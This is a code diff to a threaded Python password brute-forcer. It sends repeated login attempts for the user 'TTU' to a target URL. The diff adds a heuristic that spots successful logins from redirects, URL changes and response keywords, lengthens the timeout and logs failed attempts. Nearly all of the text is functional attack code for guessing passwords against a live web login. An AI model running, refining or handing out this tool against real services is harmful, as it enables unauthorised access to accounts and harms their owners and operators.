@@ -15,6 +15,21 @@ FOUND_PASSWORD = None
 session = requests.Session()
 lock = threading.Lock()
 
+def is_success_response(response):
+    if response.history:
+        return True
+    if response.status_code in (301, 302, 303, 307, 308):
+        return True
+    if response.url != URL:
+        return True
+    body = response.text.lower()
+    if any(word in body for word in ('invalid', 'incorrect', 'failed', 'error', 'try again', 'login failed')):
+        return False
+    if any(word in body for word in ('login', 'sign in', 'password')):
+        return False
+    return True
+
+
 def attempt_password(password):
     global FOUND, FOUND_PASSWORD
     with lock:
@@ -24,14 +39,15 @@ def attempt_password(password):
     payload = {"username": "TTU", "password": password}
     
     try:
-        response = session.post(URL, json=payload, timeout=5)
-        if response.status_code == 200:
+        response = session.post(URL, json=payload, timeout=10)
+        if is_success_response(response):
             with lock:
-                FOUND = True
-                FOUND_PASSWORD = password
+                if not FOUND:
+                    FOUND = True
+                    FOUND_PASSWORD = password
             print(f"\n[+] SUCCESS! Password found: {password}")
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"[!] request failed for {password}: {e}")
 
 def run_test(target_url=None):
     global URL, FOUND
